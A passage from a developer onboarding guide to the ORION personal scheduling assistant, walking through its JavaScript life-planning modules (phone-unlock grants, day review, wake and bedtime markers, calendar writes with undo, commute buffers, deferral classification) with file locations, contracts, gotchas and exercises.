  - **Falls through to `{grant: 0, say: ""}`** for any lock whose `why` is not night/work/checkin and when it is after 06:00 (e.g. a "focus" lock): an empty message.
  - Any non-empty reason works ("asdf", "no"): the "reason" test is only against blank/please/pls. It is a nudge, not an enforcement.
  - Any lock before 06:00 is treated as a night lock even if it is a work lock.
  - A grant can compute to 0 after the cap (e.g. `untilMinute == now.minute`) and still fall in the "with a reason" branch, producing "Unlocked for 0 min" **(inferred from reading `:77-90`; not run)**.
  - The phone's own lock logic (`native/OrionMobile/App/ScreenWatch.swift`) is separate Swift; the review packet lists notification/escalation wiring as undone (`docs/planning/v2/LIFE_LOOP_REVIEW.md`, "Needs wiring").
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {decideGrant} from "./scripts/lib/life/grant-policy.mjs"; console.log(decideGrant({now:{date:"2026-10-14",minute:60},asked:30,reason:"message my group",lock:{why:"night",untilMinute:420},firstCommitment:540,grantsTonight:0}))'`
  2. `node --test tests/truthful-grant-policy.test.mjs` (8 tests).
- **Questions to ask your tutor.**
  1. Why 20 min at night with a reason and 15 min in a work block, and what do the 60-minute and twice-per-night caps protect?
  2. How does the sleep-left check decide to drop a grant to 10?
  3. What should happen for an unknown `lock.why`?
  4. Where would this be plugged in (which CLI, which tool) and what would the model say?

#### 2.9.12 `day-review.mjs`: "planned vs done" for the day

- **What it is.** Produces the end-of-day sentence: how many of ORION's planned blocks that have ended were done, which slipped (up to 3 named), how late he started things, and what tomorrow starts with. **Not called by any executable at HEAD.**
- **Where.** `scripts/lib/life/day-review.mjs` (148 lines): `reviewDay` `:5-121`; `getLongWords` `:126-128`; `sharesWord` `:133-136`; `minuteToClock` `:141-148`.
- **How it works.**
  1. Planned = blocks with `source === "orion"`, `end <= now.minute`, not kind `rest`, not titled exactly `Wind down` or `Break` (`:24-30`). None -> `{planned:0, done:0, slipped:[], lateMinutes:null, text:"Nothing was planned today."}`.
  2. A planned block is **done** if a check-in with `phase === "done"` shares a >= 4-letter word with its title, or a `todosDone` string does (`:43-69`).
  3. `slipped` = planned minus done (titles). `lateMinutes` = median of `startedMinute - dueMinute` over check-ins that started (`:78-91`).
  4. Text: `"Today: D of P planned blocks done."` + `" Slipped: a, b, c, and N more."` (first three) + `" You started things about M min late."` (only if M >= 10) + `" Tomorrow starts with <title> at H:MM AM/PM."`.
- **Contracts.** `reviewDay({date, blocks, checkins: [{what, dueMinute, startedMinute|null, doneMinute|null, phase}], todosDone: string[], now: {date, minute}, tomorrowFirst?: {title, minute}})` -> `{planned, done, slipped, lateMinutes, text}`; throws `TypeError` for missing/ill-typed inputs.
- **Calls out to.** Nothing. **History.** `aa401a1` 2026-10-01 `agent(day-review): Planned against done` (Qwen). Test `tests/truthful-day-review.test.mjs` (8).
- **Gotchas & lessons.**
  - **A block titled "Gym" can never be counted done**, because matching needs a shared word of 4+ letters and "gym" has 3 (`getLongWords` filters `length >= 4`). I ran it: `Gym` stays in `slipped` even with a done check-in "gym".
  - Matching is by shared word, so "Study for macro" matches a done "study macro" and also any other done check-in containing "study".
  - Titles are compared case-insensitively with punctuation stripped, no stemming.
- **Walk it yourself.** `node --test tests/truthful-day-review.test.mjs`; then run `reviewDay` with a `Gym` block and a done `gym` check-in as in the note above.
- **Questions to ask your tutor.** (1) Why "ended by now" instead of "all planned"? (2) What is a better "done" signal than word overlap? (3) Why exclude Wind down and Break from "planned"? (4) How would you hook this into the 9 PM nudge?

#### 2.9.13 `weekly.mjs`: expand a weekly template into dated blocks

- **What it is.** Takes a weekly timetable (term dates, skip list, per-weekday entries) and returns the fixed blocks for one date. It was meant for the class timetable. **Not called by any executable at HEAD:** the class timetable lives as recurring events in Apple Calendar instead (`docs/planning/v2/LIFE_LOOP_REVIEW.md`, "Needs wiring": "The class timetable as a weekly template (today it lives in Apple Calendar as recurring events)").
- **Where.** `scripts/lib/life/weekly.mjs` (111 lines): `blocksForDate(template, date)` `:8-111`.
- **How it works.** Validates the template strictly (`from`/`until` strings, `skip` array, `entries[]` each with `id`, `title`, `kind`, integer `weekday` 1..7 (ISO, Monday = 1), integer `start` 0..1439, integer `end` 1..1440, `start < end`; anything else throws `TypeError("invalid template")`), computes the ISO weekday of `date` with `Date.UTC`, returns `[]` if `date < from`, `date > until`, or `date` is in `skip`; otherwise maps the matching entries to blocks `{id: "<entry.id>-<date>", title, kind, date, start, end, fixed: true, source: "template"}` sorted by start.
- **Contracts.** `template = {from: "YYYY-MM-DD", until: "YYYY-MM-DD", skip: ["YYYY-MM-DD"], entries: [{id,title,kind,weekday,start,end}]}`. Output blocks are always `fixed: true`, `source: "template"`.
- **Calls out to.** Nothing. **History.** `b8a2e21` 2026-09-29 `agent(life-weekly)` (Qwen). Test `tests/life-weekly.test.mjs` (7).
- **Gotchas & lessons.** Date comparisons are string compares (fine for ISO). A bad `date` string throws the same `"invalid template"` message, which is misleading (`:69-71`). Weekday is ISO here but JS in `plan-parse`/`task-spread`. Run it: `blocksForDate({from:"2026-09-01",until:"2026-12-15",skip:["2026-10-14"],entries:[{id:"econ",title:"ECON1115",kind:"class",weekday:3,start:540,end:630}]},"2026-10-21")` returns one block `econ-2026-10-21` 09:00-10:30.
- **Questions to ask your tutor.** (1) Why would the Apple Calendar approach have won over a template? (2) How would skip dates (reading week) be fed from the registrar calendar? (3) What would `source: "template"` need to behave like `calendar` in `toBlocks`?

#### 2.9.14 `night.mjs`: wake line, asleep-by line, and what actually happened

- **What it is.** Computes, per day, when he should wake and when he should be asleep, and (from WHOOP, phone events and motion) when he actually woke and slept. Used by the Mac's day view and the phone's `NightPlan` (the Swift `native/Orion/Sources/Orion/NightMarkers.swift:9` says it reads `night.json` produced from this file), and by `orion-reschedule` to end the day at the asleep-by line. Header (`:1-11`): Nick asked for "little markers for when i wake up (orion alarm) and when i should be asleep by (wind down is prior to that and ends at the 'asleep' line)".
- **Where.** `scripts/lib/life/night.mjs` (90 lines): `wakeOn` `:17-24`; `bedOn` `:27-35`; `nightMarkers` `:38`; `readWakeRequest` `:43-51`; `actualWake` `:64-77`; `actualSleep` `:80-90`.
- **How it works.**
  1. **Wake** (`wakeOn`): if `wake-request.json` holds a request for that date whose minute is **before 12:00** (a morning alarm), that is the wake time ("Wake me at 3:30" after a lunchtime nap once drew the wake line at 3:30 PM, 2026-09-30); else `min(usualWake, first real commitment's start - readyMinutes)` where a "real" commitment is a fixed block not from ORION (so an ORION-planned 8 AM side project cannot drag the alarm to 6:45); `readyMinutes` default 105 (7:15 for a 9:00 class).
  2. **Bed** (`bedOn`): `target = bedtime` (if `bedtime < 12:00` it is after midnight: `1440 + bedtime`); `needed = 1440 + wakeOn(nextDay) - sleepHours*60`; `bed = min(target, needed)`; if a real fixed block that day ends after `bed`, then `bed = latestEnd + commuteMinutes` (a night out plus the trip home). May exceed 1440.
  3. **Actual wake** (`actualWake`), most trusted first: (1) WHOOP night whose `wokeAt` is that morning (03:00-14:00), longest night wins -> `{minute, source:"whoop"}`; (2) phone `sleepLog` event `"up"` that morning, earliest -> source phone; (3) first phone signal after the last "bed" event and after 04:00 that shows `charging === false` or motion walking/running/cycling/vehicle -> source phone; else null. `now` filters out future evidence.
  4. **Actual sleep** (`actualSleep`): WHOOP `fellAsleep` in the evening (>= 18:00 on `date`) or early next morning (< 12:00; returned as `1440 + minute`), else the latest phone `"bed"` event.
- **Contracts.** `wakeOn/bedOn/nightMarkers(date, {blocksOf: (date) => blocks[], config, wakeRequest = null})` -> minutes (or `{date, wake, bed}`). `readWakeRequest()` -> `{date, minute}|null`. `actualWake/actualSleep(date, {nights, sleepLog, phoneSignals, now})` -> `{minute, source}|null`.
- **Files.** Reads `~/.openclaw/orion-controlled/wake-request.json` (`{at: ISO}`, written by `scripts/orion-wake`). `orion-watch` reads `sleep-actual.json` and `health-log.json` and writes `night.json` (`orion-watch:75-97`).
- **Calls out to.** `config.toMinute`. Callers: `orion-reschedule:58,227` (`bedOn`, `readWakeRequest`, window end), `orion-watch:29,75-97` (markers + actuals).
- **History.** `35e4889` 2026-10-01 "wake and asleep-by markers on the Mac and phone day views"; `44c1443` 2026-10-01 "105 minutes to get ready (7:15 for a 9:00 class)"; `017d51c` 2026-10-01 "the wake line moves to when he actually woke; the night lock ends in the morning".
- **Gotchas & lessons.**
  - Live check: with wake 09:00 usual, a 09:00 class tomorrow, `readyMinutes` 105, bedtime 00:00, sleepHours 8: `wakeOn` = 435 (07:15), `bedOn(today)` = 1395 (23:15) (I ran it).
  - `bedOn` uses `blocksOf(date)` for the late-fixed rule only for the same date, and calls `wakeOn(dayAfter)`; `dayAfter` formats with `toLocaleDateString("en-CA")` in local time, so it assumes the machine's timezone is Nick's.
  - The same rule is re-implemented in Swift (`NightMarkers.swift`, phone `NightPlan`); a change here must be mirrored there ("The same rule the phone's NightPlan uses to set the real alarm", `:4-5`).
  - `readWakeRequest` ignores any requested time at or after noon.
- **Walk it yourself.** `cat ~/.openclaw/orion-controlled/night.json`; `node --test tests/life-night.test.mjs` (10 tests); read `scripts/orion-watch:70-100`.
- **Questions to ask your tutor.** (1) Why exclude ORION's own blocks from the wake calculation? (2) How does `bedOn` handle a night out? (3) Why is WHOOP trusted over the phone and the phone over motion? (4) What breaks if the Mac and the phone disagree about `readyMinutes`?

---

### 2.10 Supporting modules (short form)

Each has: What / Where / How / Contracts / Gotchas. History hashes are the first and last commits from `git log --format='%h %ad' -- <file>`.

#### `live-day.mjs`: calendar events become blocks

- **What.** The read side. Pulls Apple Calendar through the bridge, drops events Nick never goes to or has skipped, and classifies each event into a block kind and fixed/movable. Header: "Calendar events are fixed; only what ORION booked itself ... is movable. Read-only." (`:1-4`).
- **Where.** `classify` `:13-23`; `isSocial` `:26-28`; `MOVABLE_ALONE` `:31`; `movable` `:33-37`; `toBlocks` `:40-59`; `calendarEvents` `:61-64`; `liveDay` `:66-68`; `localDate` `:10`.
- **How.** `classify(title)` goes in this order: class (lecture/seminar/lab/workshop/tutorial/class or a course code `cs|econ|mktg` + 3-4 digits) -> deadline (`due ...`, quiz, exam, deadline, submission) -> gym -> study -> side_project (youtube/video/editing/content/side project/thumbnail/filming) -> meal -> rest (nap/rest/break/relax/chill/game/play) -> other. `toBlocks(events, date)` keeps events whose `allDay !== "true"` (a string compare) and whose **start** date is `date`; marked ORION events keep their `orion` kind (but class/deadline become `study`); `end` is clamped to 1440 if the event ends on a later day; id `cal-<i>-<identifier-normalised-to-24-chars>`; `source` is `orion` or `calendar`; `calendarId` = the bridge's event identifier.
- **Contracts.** Bridge call `list_upcoming_calendar_events {from:"today"}` returns `{events_json: "<JSON string>"}`; each event `{title, start, end, allDay, identifier, orion?}`. Output blocks per 2.2.
- **Gotchas.** An event crossing midnight lives on its start day only (a 23:00-01:00 plan is capped at 1440 on day 1 and absent on day 2). `isSocial` is a regex that makes anything with the word "with" a wall, which is why "Dinner with friends" is fixed but also why "Study with Sam" is. `classify` word lists are substring-ish with word boundaries only on some alternatives; "reading" counts as study. History: `37c29fd` 2026-09-30 ... `e568abb` 2026-10-06 (skips).

#### `bridge-path.mjs`: which bridge, and what time it is

- **What.** One chokepoint for calendar I/O and the clock, so evaluation runs can swap in a sandbox day. **Where.** `sandbox` `:23-26`; `clockNow` `:29-33`; `bridgeRequest` `:36-46`.
- **How.** `bridgeRequest(action, payload, {timeout = 30000})` serialises `{id:"life", action, payload}`, single-quote-escapes it, runs `/bin/sh -c "printf '%s\n' '<json>' | \"<bin>\""` and parses the first stdout line starting with `{`; throws `Error(parsed.error ?? "the calendar bridge did not answer")` unless `ok`. `clockNow()`: `ORION_RESCHEDULE_NOW` (tests/replays) wins; else the sandbox day's `now`; else the real clock. `sandbox()` returns the parsed `eval-calendar.json` only if no `ORION_BRIDGE_BIN` is set, eval mode is on (marker < 2 h old) and the file exists.
- **Contracts.** Env: `ORION_BRIDGE_BIN`, `ORION_SANDBOX_CALENDAR`, `ORION_RESCHEDULE_NOW`. Bridge binary candidates in 2.5.
- **Gotchas.** Shelling out through `sh -c` with string interpolation is safe here only because the single quotes in JSON are escaped (`replace(/'/g, "'\\''")`) and the bin path is not user-controlled. Single commit: `3034d64` 2026-10-01.

#### `calendar-write.mjs`: write to the calendar, with undo

- **What.** The only module that changes the calendar. Applies a plan as deletes, moves and creates through the bridge and journals each step so `orion-reschedule undo` can reverse it. Header: "One change, one undo step (2026-09-29)": "Two study sessions" had been two journal entries so undo removed one and ORION said both were gone (`:25-31`).
- **Where.** `iso` `:18-21`; `clean` `:23`; `reverseSteps` `:32-57`; `applyPlan` `:59-101`; `undoLast` `:103-113`; `recordUndo` `:116-122`.
- **How (`applyPlan({date, moves, created, removed, blocksById, group, pinIds, pinCreated})`).** Order: delete `removed` (record `{op:"delete", ... orionKind?}`), move `moves` (`end` = `toEnd` if given else `to + old length`), create `created` (`orionKind` set only when `!c.fixed`, so Nick's own plans stay unmarked and never move). On any bridge error, `reverseSteps` undoes the steps done so far (rollback) and rethrows (with `rollback also failed:` appended if that fails too). Then pins: remove deleted ids, add `pinIds` and newly created ids in `pinCreated`, `savePins`. If anything was recorded: append (or merge into the previous entry when `group` matches) to the undo journal, keep the last 10. `undoLast()` pops the last entry with steps, runs `reverseSteps` (reverse order; a delete is undone by re-creating the event, remapping pin ids to the new identifiers), and rewrites the pins from `pinsBefore`. `recordUndo(steps)` journals out-of-band changes (skipping a class: ops `delete` and `unskip`).
- **Contracts.** Bridge actions `move_calendar_event`, `create_calendar_event`, `delete_calendar_event`. Journal and pins shapes in 2.5. `iso(date, minute)` converts local date + minute (minutes >= 1440 roll into the next day) to a UTC `Z` string.
- **Gotchas.** `readPins()` throws on a corrupt `pins.json` (only `ENOENT` is tolerated, `pins.mjs:9`), which would abort every plan write; `undoLast` writes the journal directly (not tmp+rename, `:111`); a no-op plan never records an entry ("a change that did nothing still wrote an empty entry for undo to land on"). History: `37c29fd` 2026-09-30, `4205b85` ("make day-plan replacement transactional"), `3034d64`, `0a0aa7e`, `e568abb` 2026-10-06.

#### `commute.mjs`: travel-time walls

- **What.** Blocks of time that planning must not use because he is travelling. Born from "ORION put a nap at 12:30, the minute his lab ended, 'which he should know i need to commute back to my room for that first'" (`:3-6`).
- **Where.** `commuteWalls` `:7-34`; `commuteBlocks` `:37-40`.
- **How.** Real classes only (`kind === "class" && fixed && source !== "orion"`; an ORION to-do filed as class made its own travel time and pushed itself two hours later, 2026-10-01). Walls: `commute to class` before the first class and `commute home` after the last (`commuteMinutes`, default 30); between two classes with a gap >= `homeGapMinutes` (default 150) both a `commute home` after the first and a `commute to class` before the next (2026-10-05: lecture until 12:30, lab at 15:30, nap booked at 12:30); and `getting to X` / `getting back from X` around any fixed non-class block for which `isSocial(title)`. `commuteBlocks` wraps them as fixed pseudo-blocks `commute-<i>` for gap-finding code (the pseudo-blocks never reach the calendar, `orion-watch:118-122`).
- **Gotchas.** `commuteMinutes <= 0` disables all of it. `early.mjs` calls it without `homeGapMinutes`. "Dinner with friends" is `isSocial`, so it gets travel walls even if it is in his flat **(inferred)**. History: `37c29fd`, `752ac71`, `2602593`, `6830e6d` ("travel home between classes"), `295000a`.

#### `gaps.mjs`: free intervals in a window

- **What.** `freeGaps(blocks, {start,end}, {buffer = 0, minimum = 15})` returns the sorted non-overlapping free intervals. **How.** Keep blocks overlapping the window; clip to the window; **only `fixed` blocks get `buffer` added** on each side (`:27-30`); merge overlaps and adjacent; take the complements; drop gaps shorter than `minimum`. Used everywhere (`replan` passes `minimum: 5` and pads blocks itself; `fill-day`, `fit-study`, `orion-watch` use their own).
- **Gotchas.** A `fixed` flag is what triggers buffering, so a pinned ORION block (fixed true) is buffered but an unpinned one is not. Commit `7ddf825` 2026-09-29 (Qwen) is its only commit; `tests/life-gaps.test.mjs` (6).

#### `lengths.mjs`: minimums and shrink-to-fit

- **What.** "Naps should be at least an hour and 15 minutes ALWAYS" and "you can change how much time is allotted to non priority items": minimum lengths per title key, and the shrink step when the day overflows. **Where.** `minimumFor` `:20-25`; `withMinimums` `:28-33`; `shrinkFloor` `:36-39`; `shrinkPlan` `:48-66`; `applyShrink` `:75-87`.
- **How.** `minimumFor(title, minimums)` = the largest minimum whose key is a substring of the title. `shrinkPlan(blocks, deficit, {now, minimums})` considers only blocks that are movable, not started, not sleepy (nap/wind down/sleep/bed), and either titled optional/maybe/if there's time or of kind `rest`/`side_project`; never class/deadline, never the to-dos (kind `other`: "a first run shrank both to make room", 2026-10-01). Order: optional first, then rest before side_project, later in the day first. Each gives up `length - shrinkFloor` where `shrinkFloor = min(length, max(minimum, ceil(length/2), 20))`. `applyShrink` then slides later movable blocks up by what was freed (never past a wall, never before `now`, dinner not before 18:30).
- **Gotchas.** The comment in `applyShrink` documents a bug: "a first version freed 30 minutes at 14:28 that the 90-minute block overflowing at 23:00 could not use". History: `3034d64` 2026-10-01, `0a0aa7e` 2026-10-02.

#### `sensible-time.mjs`: when an untimed plan should start

- **What.** Nick on a test day: "why am i reading at 8 am, why am i doing my yt side project right after class with no getting back home buffer ... the timing of things are terrible" (`:2-5`). **Where.** `homeFrom` `:13-16`; `preferredStart` `:19-28`.
- **How.** `homeFrom(blocks, {commuteMinutes, wake})` = latest real class end + commute, else `wake` (default 09:00). `preferredStart({title, kind}, home)`: nap = home; breakfast = 0; lunch >= 12:00; meal kind or "dinner" >= 18:30; gym >= 17:00; evening-ish titles (reading, book, relax, tv, netflix, game, wind down, journal) or non-break `rest` >= 20:00; else `home`. Hard floor vs soft preference: the CLI sets `after` (hard) = `backHome` and `prefer` (soft) = `preferredStart` (`orion-reschedule:328-334`).
- **Gotchas.** A time Nick states never goes through here. Commits `752ac71`, `2602593`.

#### `fill-day.mjs`: what should go in the blanks

- **What.** Once the real plans are known, propose what belongs in the gaps in his priority order, always leaving time free. Nick: "orion should see when i wake up ... sees that i go to class, and then sees that my entire day after is empty. we dont want that." **Where.** `fillDay` `:11-47`.
- **How.** Asks in order: study (per `studyPlan` item, minus what is already booked as study; or, with no plan, the soonest deadline within 10 days once a day); `Gym` on gym days with none booked; side project for the remainder of `sideProjectMinutes` (>= 15); `Dinner` 45 min at `max(18:30, now)` if none in 17:00-21:30 and the window reaches 19:00; a 30-min `Break` if rest < 30; `Wind down` (`windDownMinutes`) ending at the window end if it reaches 21:00 and no real plan runs through bedtime. Then keep asks only while `free - ask.minutes >= freeMinutesKept`.
- **Gotchas.** `weekday` must be ISO 1..7. Asks are suggestions: the CLI passes them through `sensible()` then `replan`. `37c29fd` only.

#### `fit-study.mjs`: study sessions into real gaps

- **What.** For `orion-plan-study`/`orion-study`. **Where.** `fitStudy(blocks, sessions, window, now, date)` `:10-54`.
- **How.** Sessions longest first. For each: first free gap (`freeGaps` with `buffer: 10`, `minimum: 5`) from `max(window.start, now)`; if none, try displacing one movable block (kind side_project/meal/other/rest, not fixed, still ahead), lowest priority first, giving the study the start of the freed room and moving the displaced block to the latest later gap that fits. Study blocks are `study-<day>-<n>`, source `orion`. Returns `{blocks, placed, moved:[{id,from,to}], unplaced:[minutes]}`. Header: "classes, sleep, gym and deadlines never move, and side-project time is moved but never shortened".
- **Gotchas.** `orion-plan-study` windows it to 09:00-22:00 and tries one session per day first, then up to 3 per day. Commits `dd9aa26` 2026-09-29 (Claude takeover).

#### `freed-time.mjs`: what to do with time freed by finishing early

- **What.** Nick: "lets say I finish working on orion stuff early. I tell it I'm done and it re-works my schedule. It might add a break, or maybe some more work, or maybe add time to something that was already a bit short on time." **Where.** `breakFor` `:12-17`; `shortBlock` `:20-30`; `extendWithin` `:37-50`.
- **How.** `breakFor`: a 15-minute break at `now` if he worked >= 60 minutes, >= 20 freed, and neither the finished nor the next block is restful. `shortBlock`: the first later non-fixed block below his minimum for its title, or below his daily side-project minimum. `extendWithin(day, target, want, {buffer = 5, dayEnd})`: lengthen `target` by up to `want` (5-minute steps, largest first) pushing later movable blocks by the same amount, rejecting any step that overlaps a fixed block or passes `dayEnd`. Called from `orion-reschedule:668-708`. Commit `1e99edc` 2026-10-06.

#### `day-check.mjs`: the day invariants

- **What.** The rules a written day must keep (header `:1-10`, after Nick: "even after you reviewed and fixed it yourself there was still overlaps. thats not a small hey keep this in mind, that a design flaw we need to polish out"). **Where.** `checkDay(allBlocks, {from = 0})` `:20-39`.
- **How.** Only blocks ending after `from` are judged (clipped at `from`). Hard problems: a block with no length; an ORION-owned block (source orion or `fixed === false`) under 5 minutes; any overlap involving an ORION-owned block. Soft notes: two of his own fixed events overlapping. Returns `{ok, problems[], notes[]}`.
- **Contracts.** `orion-reschedule` calls it as `refuseIfBroken` before writing (`:135-139`) and again on what the calendar returns after writing (`verifyWritten`, `:141-146`). Commit `2602593` 2026-10-01; `tests/life-day-invariants.test.mjs`.

#### `pins.mjs` and `skips.mjs`: remembered user decisions

- **`pins.mjs`** (18 lines). `{ "<date>": [calendarId...] }`; `pinBlocks(blocks, date)` turns any non-fixed block whose `calendarId` is pinned into `{...b, fixed: true, pinned: true}`, so the planner keeps a time Nick chose while he can still move it himself. Written (mode 0600) by `calendar-write.applyPlan`. Commit `0a0aa7e` 2026-10-02.
- **`skips.mjs`** (23 lines). Occurrences he is skipping that ORION cannot delete (a read-only class calendar). Key = lower-cased title + `|` + ISO start. `live-day.calendarEvents` filters them out; `addSkip` forgets entries older than 14 days. `orion-reschedule skip` adds one and journals `unskip` for undo (`orion-reschedule:514-519`). Commit `e568abb` 2026-10-06 ("skipping a class needs no approval; an approval now actually runs").

#### `history.mjs` and `patterns.mjs`: planned-vs-actual memory

- **What.** `history.mjs` is the I/O half and `patterns.mjs` the pure half of "planned vs actual, kept so ORION can learn Nick's real patterns" (header `:1-5`). **Where.** `recordOutcome` `:17-22`; `summarize` `:24-33`; `loadPatterns` `:35-37`; `lateHabit` `:40-44`; `learnPatterns` (`patterns.mjs:8-27`).
- **How.** `recordOutcome({what, plannedAt, actualAt|null})` appends `{at, what, kind: classify(what), plannedStart (minute), actualStart|null, weekday}` to `life-history.jsonl`; it is called by `orion-checkin` when a check-in ends (`orion-checkin:112,176`) with `actualAt: null` for skipped ones. `summarize(healthLog)` (called every watch tick, `orion-watch:197`) reads the last 500 lines, adds sleep events from the health log (`bed` -> `sleep`, any other event -> `wake`), runs `learnPatterns` and writes `patterns.json`. `learnPatterns` gives per-kind `{planned, happened, rate, medianDelay}` and wake/sleep medians, each only with >= 3 samples. `lateHabit(patterns, kind)` returns `"You usually start these about N min late — not today."` only when >= 3 samples happened and the median delay is >= 15. `orion-reschedule:213-214` uses the median wake (3+ mornings) as the planning wake.
- **Gotchas.** Median of an even count is the mean of the middle two (not rounded in `patterns`, rounded in `lateness`). History `37c29fd` (history), `3e49366` 2026-09-29 (patterns).

#### `after-late-night.mjs`: reshape tomorrow after a short night

- **What.** `adjustForShortSleep(blocks, {sleptMinutes, wake, window, minimums})`. **How.** If `sleptMinutes >= 420` return unchanged. Else add a `Nap` (`kind: rest`, `source: orion`) of `max(45 if slept < 300 else 30, his nap minimum)` in the first free gap after the first fixed block that ends after noon (or from 12:00), and move any non-fixed study/side_project block starting before `wake + 120` into the **latest** gap that fits after `wake + 120` (right-aligned). Returns `{blocks, changes: ["Added a 45 min nap at 13:00", ...]}`. **Caller.** `orion-watch:116-134`, once per day, only while he is up, it is before 13:00, and the night was < 6 h or a bed event fell between 02:00 and 08:00; it adds commute pseudo-blocks first so the nap is not placed in the commute home. Commits `7d653a2` 2026-09-29, `6830e6d` 2026-10-05 (nap honours his minimum).

#### `morning-brief.mjs`: the first message of the day

- **What.** `morningBrief({now, blocks, deadlines, sleep, weather, sideProjectLabel})` -> `{text, parts}`, <= 300 characters. **How.** Parts in order: sleep (`Short night — 5.5h.` if < 6 h, else `Recovery's low (N%) — go easy.` if < 34), first fixed thing ahead (`X at 9:00 AM.` or `Nothing fixed today.`), shape (`N things fixed, last ends H:MM.` when >= 2), nearest deadline within 7 days (`... is today/tomorrow/in N days.`), side project unbooked (`<label> hour isn't booked — want it after <last fixed end>?`), weather if `rainChance >= 50` (`Rain likely — take a jacket.`). If > 300 characters drop weather, then side, then shape; then hard-truncate with `…`. Pure. **Caller.** `orion-watch:164-169`.
- **Gotchas.** `orion-watch` does **not** pass `weather`, so the rain line never appears at HEAD. `clock12` is exported. History: `37c29fd`; test `tests/tighten-morning-brief.test.mjs` (10).

#### `class-reminders.mjs`, `task-notes.mjs`, `todo-lists.mjs`

- **`class-reminders.mjs`** (11 lines). `classReminders(blocks, {now, sent})` returns `{id, text}` for each real class starting within the next 10 minutes (`now >= start - 10`, `now < start`) not yet in `sent`: `"<title> starts in N minutes at <campus>."` `classCampus(title)` maps titles to two hard-coded campus names (macro/ECON1115/marketing/MKTG2201 -> "Devon House"; DS/CS/data science/discrete/computer science -> "Portsoken"). `orion-watch:104-106` stores sent ids per day. `ae41446` 2026-10-02. Test `tests/scheduling-notification-policy.test.mjs`.
- **`task-notes.mjs`** (40 lines). A to-do's `notes` text: first line is the spread; subtasks are `- [ ] Title · 40%` (or `- [x]` = 100); `Tags:`/`Order:` lines belong to the apps; `Notes:` marks details with no spread (2026-10-13). `parseTaskNotes` -> `{spread, subtasks:[{title, percent, done}], other[]}`; `formatTaskNotes` round-trips and adds `Notes:` to a free first line when there is no spread/subtasks so it is not read back as a spread; `progressOf` = floor of the mean percent. Must stay byte-compatible with `native/OrionMobile/Sources/MobileCore/TaskNotes.swift`. Commits `b1b530b` 2026-10-06, `7f82b2c` 2026-10-13.
- **`todo-lists.mjs`** (45 lines). "ORION's apps show the 'Orion' Reminders list; Siri and the phone drop new reminders on the default 'Reminders' list; and ORION's planner read every list at once (Groceries ...)" (`:2-8`). `planSweep(reminders, {todoList, sweepLists})` returns `move` steps, or `complete-duplicate` when the same normalised title is already on the target list. `sweep(bridge, config)` executes through `list_incomplete_reminders`, `move_reminder`, `complete_reminder` and returns one human line per change. Called each watch tick (`orion-watch:66`) and by `orion-agenda-change`. Commit `1fc1162` 2026-10-01.

---

### 2.11 Minor and not-yet-wired modules

| Module | What it does | Key lines | Gotchas |
|---|---|---|---|
| `block.mjs` | `validateBlock` / `normalizeBlock` (returns a frozen object with only the 8 canonical fields; throws `TypeError("invalid block")`), `blockMinutes`; exports `KINDS`, `SOURCES` | `:35-122`, `:124-142`, `:144` | No executable uses it (tests only). Commit `7947249` 2026-09-29 |
| `bedtime.mjs` | `bedtimeNudge({state, minutesPastBedtime, nudgesSent, firstFixedTomorrow, now})`: only for state `awake_late`/`winding_down`; levels gentle (< 15 min past; recheck 15 min), firm (< 60 min or fewer than 2 nudges; recheck 10), escalated (else; recheck 5). Message: `It's HH:MM. Class at HH:MM — go to sleep now and you still get 5h 30m.` plus, if under 4 h, `I'll adjust tomorrow around a short night — a nap and a lighter afternoon.` | `:6-23` | `orion-now` hard-codes `nudgesSent: 2` (`orion-now:46`), so escalation depends only on minutes past bedtime. `sleepNeedMinutes` is accepted and discarded (`void`). `d20b7f3` |
| `sleep-state.mjs` | `sleepState({now, bedtime, wake, lastActiveMinutesAgo, charging})` -> `day` (outside the night), `unknown` (no signal), `awake_late` (phone used <= 5 min ago), `probably_asleep` (>= 20 min idle and charging or unknown), else `winding_down` | `:6-19` | `unknown` is never "asleep". `orion-now:38` upgrades `unknown` to `awake_late` when he is asking. `a5cae8e` |
| `next-action.mjs` | `nextAction({blocks, now, done, state})` -> `{action: "sleep"|"do"|"prepare"|"free", blockId, reason, startsIn}`: sleep after bedtime; the block under way (`comparePriority`); a block starting within 15 min; a missed movable study/deadline/side_project that already ended; the next block; or nothing | `:8-23` | `9467d24`. CLIs `orion-next` (day file) and `orion-now` (live) |
| `follow-through.mjs` | Pure state machine for one block's check-in loop. `startLoop(block)` -> `{blockId, phase:"waiting", level:0, nextCheckAt: block.start, deferrals:0, history:[]}`. `step(loop, event, now)` events `tick`, `ignored`, `started` (phase `active`, check again in 25 min), `done`, `cancelled`, `defer {legitimate, minutes}`. Escalation level capped at 4 with gaps `[10,10,5,5]` minutes; a legitimate deferral (max 2) waits `clamp(minutes, 5, 45)`; others escalate | `:10-48`, `GAPS :3` | Every step returns a new object (history appended). Used by `orion-checkin:22,91,104,113,127,137,164`. `d601e7b` |
| `deferral.mjs` | `classifyDeferral(text, {deferralsToday, minutesAvoided})` -> `{kind: "change"|"avoidance"|"pause"|"unclear", minutes, confidence}`. Checked in order: CHANGES (friend(s), invited, hang out, class ran late, running late, sick, ill, headache, exhausted, can't keep eyes open, emergency) -> change 0 min; AVOID (in a bit, later, 5 more minutes, one more video, not now, tomorrow) -> avoidance 15; PAUSES (eat/hungry/food/lunch/dinner 25, shower 20, bathroom 5, call 15, laundry 10) -> pause, unless `minutesAvoided >= 60 && deferrals >= 2` then avoidance. Else `unclear` 10 min, confidence 0.3. Confidence 0.8, or 0.6 after 2 deferrals | `:14-27` | "I'll eat later" is `avoidance`, not a pause, because AVOID is checked before PAUSES. `aa23df6` |
| `daily-needs.mjs` | `dailyNeeds(blocks, config)` -> `{met: [...], missing: [{need, minutes}]}` for side_project, gym (gym days only), rest (30), meals (>= 2 meal blocks) | `:6-58` | `orion-now:41` passes only `{weekday}` so the **module's own defaults** (60/[1,3,5]/60/30) apply and `life-config.json` is ignored. `99620b4` |
